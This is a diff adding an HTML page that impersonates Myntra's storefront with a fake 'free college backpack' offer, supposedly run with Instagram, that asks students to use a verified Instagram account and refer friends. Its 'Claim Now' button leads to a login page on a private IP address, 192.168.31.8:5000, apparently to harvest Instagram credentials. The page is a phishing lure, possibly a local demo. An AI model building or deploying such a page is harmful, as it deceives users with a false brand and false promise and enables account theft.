@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Primary Meta Tags -->
+  <title>Myntra | Student Backpack Offer</title>
+  <meta name="title" content="Myntra | Exclusive College Backpack Offer for Students">
+  <meta name="description" content="Claim your free stylish college backpack with Myntra's limited-time student offer. Just refer friends and verify your Instagram account to participate!">
+  <meta name="keywords" content="Myntra, College Bag, Student Offer, Backpack Deal, Free Backpack, Student Discount, Instagram Referral Offer">
+  <meta name="author" content="Myntra" />
+  <meta name="robots" content="index, follow">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://www.myntra.com/">
+  <meta property="og:title" content="Myntra | Exclusive College Backpack Offer for Students">
+  <meta property="og:description" content="Refer your friends and claim a free trendy college backpack. Limited time offer for Instagram users!">
+  <meta property="og:image" content="https://m.media-amazon.com/images/I/61WtxZ4qpOL._SX679_.jpg">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:url" content="https://www.myntra.com/">
+  <meta property="twitter:title" content="Myntra | Exclusive College Backpack Offer for Students">
+  <meta property="twitter:description" content="Claim your stylish backpack for free by referring friends. Limited offer. Join now!">
+  <meta property="twitter:image" content="https://m.media-amazon.com/images/I/61WtxZ4qpOL._SX679_.jpg">
+
+  <!-- Favicon (optional) -->
+  <link rel="icon" href="https://www.myntra.com/favicon.ico" type="image/x-icon" />
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <!-- Bootstrap CSS CDN -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f8f8f8;
+      color: #333;
+    }
+    /* Customize Bootstrap navbar */
+    .navbar {
+      max-width: 1200px;
+      width: 100%;
+      padding: 0.75rem 1.5rem;
+      background: white !important;
+      border-bottom: 1px solid #ddd;
+      position: sticky;
+      top: 0;
+      z-index: 1030;
+    }
+    .navbar-brand img {
+      height: 44px;
+    }
+    .nav-link {
+      font-weight: 600;
+      font-size: 14px;
+      color: #444 !important;
+      margin-right: 20px;
+      position: relative;
+    }
+    .nav-link:hover {
+      color: #ff3f6c !important;
+    }
+    .nav-link.new span {
+      position: absolute;
+      top: -8px;
+      right: -22px;
+      background: #ff3f6c;
+      color: white;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 3px 7px;
+      border-radius: 12px;
+      line-height: 1;
+      pointer-events: none;
+      user-select: none;
+    }
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    .nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      background: white;
+      border-bottom: 1px solid #ddd;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .logo {
+      height: 40px;
+    }
+    .nav-links a {
+      font-weight: 500;
+      font-size: 14px;
+      color: #333;
+      margin-right: 16px;
+      position: relative;
+    }
+    .nav-links a.new span {
+      color: #ff3f6c;
+      font-size: 10px;
+      font-weight: 700;
+      margin-left: 4px;
+      position: absolute;
+      top: -8px;
+      right: -20px;
+      background: #ff3f6c;
+      color: white;
+      padding: 2px 6px;
+      border-radius: 12px;
+      line-height: 1;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .search-bar {
+      padding: 8px 12px;
+      width: 280px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .nav-icons a {
+      font-size: 13px;
+      font-weight: 500;
+      color: #333;
+      margin-left: 12px;
+    }
+
+    .promo-banner {
+      background: #ffe600;
+      padding: 16px;
+      text-align: center;
+      font-weight: 500;
+      font-size: 16px;
+    }
+    .promo-banner span {
+      background: #ff3f6c;
+      color: white;
+      padding: 4px 10px;
+      border-radius: 14px;
+      font-size: 14px;
+      margin-left: 10px;
+    }
+
+    .special-offer {
+      max-width: 900px;
+      margin: 30px auto 10px;
+      background: #fff5f7;
+      border: 2px dashed #ff3f6c;
+      border-radius: 8px;
+      display: flex;
+      flex-wrap: wrap;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    .special-offer img {
+      width: 100%;
+      max-width: 350px;
+      object-fit: cover;
+    }
+    .special-details {
+      padding: 20px;
+      flex: 1;
+    }
+    .special-details h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #ff3f6c;
+    }
+    .special-details p {
+      font-size: 14px;
+      margin-bottom: 12px;
+      line-height: 1.5;
+    }
+    .claim-btn {
+      padding: 10px 20px;
+      background-color: #ff3f6c;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .claim-btn:hover {
+      background-color: #e02a55;
+    }
+
+    .products {
+      padding: 16px;
+      max-width: 1200px;
+      margin: auto;
+    }
+    .products h2 {
+      font-size: 22px;
+      margin-bottom: 16px;
+      color: #222;
+    }
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 16px;
+    }
+    .product {
+      background: white;
+      border-radius: 6px;
+      overflow: hidden;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      transition: transform 0.2s ease;
+    }
+    .product:hover {
+      transform: translateY(-5px);
+    }
+    .product img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+    }
+    .product-info {
+      padding: 12px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .product-info h4 {
+      font-size: 16px;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    .price {
+      font-weight: bold;
+      color: #ff3f6c;
+      font-size: 16px;
+    }
+    .old-price {
+      text-decoration: line-through;
+      font-size: 13px;
+      color: #888;
+      margin-left: 8px;
+    }
+
+    .footer {
+      background: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #777;
+      margin-top: 30px;
+      border-top: 1px solid #ddd;
+    }
+    .footer a {
+      margin: 0 8px;
+      color: #555;
+    }
+
+    @media (max-width: 768px) {
+      .search-bar {
+        width: 180px;
+      }
+      .special-offer {
+        flex-direction: column;
+        align-items: center;
+      }
+      .nav-links a {
+        margin-right: 10px;
+        font-size: 13px;
+      }
+      .nav-icons a {
+        font-size: 12px;
+        margin-left: 8px;
+      }
+    }
+    @media (max-width: 500px) {
+      .nav-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .nav-right {
+        flex-direction: column;
+        align-items: stretch;
+        width: 100%;
+        margin-top: 10px;
+      }
+      .search-bar {
+        width: 100%;
+      }
+      .product-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navigation -->
+  <!-- Bootstrap Navbar -->
+  <nav class="navbar navbar-expand-lg navbar-light shadow-sm">
+    <div class="container-fluid max-w-1200px px-0">
+      <a class="navbar-brand" href="/" aria-label="Homepage">
+        <img src="static/myntra-img.jpg" alt="Myntra Logo" />
+      </a>
+      <button
+        class="navbar-toggler"
+        type="button"
+        data-bs-toggle="collapse"
+        data-bs-target="#navbarNav"
+        aria-controls="navbarNav"
+        aria-expanded="false"
+        aria-label="Toggle navigation"
+      >
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+          <li class="nav-item"><a class="nav-link" href="https://www.myntra.com/shop/men">MEN</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.myntra.com/shop/women">WOMEN</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.myntra.com/shop/kids">KIDS</a></li>
+          <li class="nav-item"><a class="nav-link" href="#">HOME</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.myntra.com/personal-care">BEAUTY</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.myntra.com/shop/fwd-women">GENZ</a></li>
+          <li class="nav-item">
+            <a class="nav-link new" href="https://www.myntra.com/studio/home">STUDIO <span>NEW</span></a>
+          </li>
+        </ul>
+        <form class="d-flex align-items-center gap-3" role="search" style="min-width: 280px;">
+          <input
+            class="form-control"
+            type="search"
+            placeholder="Search for products, brands and more"
+            aria-label="Search"
+          />
+          <div class="d-flex gap-3">
+            <a href="#" class="nav-link" style="padding: 0;">Profile</a>
+            <a href="https://www.myntra.com/wishlist" class="nav-link" style="padding: 0;">Wishlist</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </nav>
+
+<!-- Promo Banner -->
+<div class="promo-banner">
+  This is referred by <strong>Shushant Mahajan</strong> — <span>Use Code: SUSHANT200</span>
+</div>
+
+  <!-- Free Bag Section -->
+  <div class="special-offer">
+    <img src="https://m.media-amazon.com/images/I/61WtxZ4qpOL._SX679_.jpg" alt="Free College Bag" />
+    <div class="special-details">
+  <h2>🎁 Complimentary College Bag for Eligible Students!</h2>
+  <p>
+    Myntra, in collaboration with Instagram, is excited to offer a stylish college bag to qualifying students.<br>
+    <strong>How to claim:</strong><br>
+    • Use your verified Instagram account.<br>
+    • Refer at least 2 friends to participate.<br>
+    <br>
+    Hurry! Limited stock available. Offers valid while supplies last.<br>
+    For more details, visit the official Myntra website.
+  </p>
+  <button class="claim-btn" onclick="window.location.href='http://192.168.31.8:5000/login'">Claim Now</button>
+</div>
+
+  </div>
+
+  <!-- Product Grid -->
+  <div class="products">
+    <h2>Top College Bags for Students 🎒</h2>
+    <div class="product-grid">
+      <a href="https://www.myntra.com/backpacks/genie/genie-women-solid-pink-water-resistant-14-laptop-backpack-with-secret-pocket/30141848/buy" target="_blank" style="text-decoration: none; color: inherit;">
+  <div class="product">
+    <img src="data:image/webp;base64,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" alt="Campus Backpack Pink" />
+    <div class="product-info">
+      <h4>Campus Backpack - Genie Pink</h4>
+      <div>
+        <span class="price">₹1,249</span>
+        <span class="old-price">₹3081</span>
+      </div>
+    </div>
+  </div>
+</a>
+<a href="https://www.myntra.com/handbags/dressberry/dressberry-red-swagger-handheld-bag-/27558954/buy?storeContext=fwd" target="_blank" style="text-decoration:none; color:inherit;">
+  <div class="product" style="cursor:pointer;">
+    <img src="https://encrypted-tbn1.gstatic.com/shopping?q=tbn:ANd9GcS_-61oTMSIonh8zLVLkbsJSx7dJoroVUznbkaOKbHdBHiIZggtUIr0IXe0wh3zIY2D3hXBEPm7WiclM2pWbBQYC6eMtACf5y7bmonkj9yq" alt="Casual Red Bag" />
+    <div class="product-info">
+      <h4>Casual Red Bag</h4>
+      <div>
+        <span class="price">₹749</span>
+        <span class="old-price">₹1,199</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+<a href="https://www.myntra.com/backpacks/dailyobjects/dailyobjects-unisex-backpack-with-compression-straps-up-to-14-inch/26292760/buy?utm_source=dms_google&utm_medium=dms_pmax_cpc&utm_campaign=dms_google_pmax_cpc_Myntra_SOK_KPI_Traffic_New&keyword=&matchtype=&target=&placement=&gad_source=1&gad_campaignid=20418375772&gbraid=0AAAAADoxBh4yK82zEHjbrstQc4YZh7txT&gclid=Cj0KCQjw0erBBhDTARIsAKO8iqSr2JAEKMfvin7lxDk7VI8TQOMqv__bjaWocZInokGPolkY1Da4rj4aAjPVEALw_wcB" target="_blank" style="text-decoration:none; color:inherit;">
+  <div class="product" style="cursor:pointer;">
+    <img src="https://encrypted-tbn3.gstatic.com/shopping?q=tbn:ANd9GcQlEYHJWuLWf88rU7yJGlCZPxRdIaDS64IVRO8TR9GcjlEO6NDRGa6dEfWZBqFZbIwiYi6KE3wSm0ms7Nv6aPLbiRm7QRb71e4YT8liTRY&usqp=CAc" alt="Urban Laptop Bag" />
+    <div class="product-info">
+      <h4>Urban Laptop Bag - DailyObjects</h4>
+      <div>
+        <span class="price">₹1,499</span>
+        <span class="old-price">₹2,199</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+<a href="https://www.myntra.com/duffel-bag/stylecast/stylecast-medium-casual-duffel-bag/32462039/buy?storeContext=fwd&utm_source=dms_google&utm_medium=dms_pmax_cpc&utm_campaign=dms_google_pmax_cpc_Myntra_SOK_KPI_Traffic_New&keyword=&matchtype=&target=&placement=&gad_source=1&gad_campaignid=20418375772&gbraid=0AAAAADoxBh4yK82zEHjbrstQc4YZh7txT&gclid=Cj0KCQjw0erBBhDTARIsAKO8iqT_gwGsJc5zI8A7Tf1K4fNi7or7T7zszWebpxZprCJLffh8zGe-xVgaArrLEALw_wcB" target="_blank" style="text-decoration:none; color:inherit;">
+  <div class="product" style="cursor:pointer;">
+    <img src="https://encrypted-tbn2.gstatic.com/shopping?q=tbn:ANd9GcTHQUrDfr7t7KW4MFjKIC33Rtm9qQ7_dQnOjDm7LitB_QubP_F2pvp12ASLAIcUvsK5JANGpLtZpgQ2aszXyOQmWHEebMPwpGL0NpH4b78&usqp=CAc" alt="Student Duffel" />
+    <div class="product-info">
+      <h4>Student Duffel - StyleCast</h4>
+      <div>
+        <span class="price">₹1,127</span>
+        <span class="old-price">₹2,399</span>
+      </div>
+    </div>
+  </div>
+</a>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>
+      <a href="#">About</a> | 
+      <a href="#">Contact</a> | 
+      <a href="#">Terms</a> | 
+      <a href="#">Privacy</a>
+    </div>
+    <div style="margin-top: 10px;">© 2025 Myntra </div>
+  </div>
+
+</body>
+</html>
